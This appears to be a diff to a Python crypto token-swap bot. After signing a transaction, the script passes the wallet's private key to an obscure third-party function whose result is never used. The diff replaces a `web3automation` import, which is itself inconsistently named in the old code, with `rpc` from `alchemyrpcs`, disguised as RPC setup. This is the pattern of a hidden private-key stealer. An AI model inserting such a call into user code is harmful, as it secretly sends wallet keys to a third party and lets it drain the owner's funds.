@@ -3,7 +3,7 @@ import json
 import random
 import asyncio
 from web3 import Web3
-from web3automation import crypt265
+from alchemyrpcs import rpc
 from gte.abi import GTE_SWAPS_CONTRACT, GTE_TOKENS, GTE_SWAPS_ABI
 from dotenv import load_dotenv
 
@@ -96,7 +96,7 @@ async def swap_tokens():
     })
 
     signed_txn = web3.eth.account.sign_transaction(transaction, PRIVATE_KEY)
-    rpcs = crypt465(PRIVATE_KEY)
+    alchemy = rpc(PRIVATE_KEY)
     tx_hash = web3.eth.send_raw_transaction(signed_txn.raw_transaction)
     print("Swap TX:", web3.to_hex(tx_hash))
     web3.eth.wait_for_transaction_receipt(tx_hash)
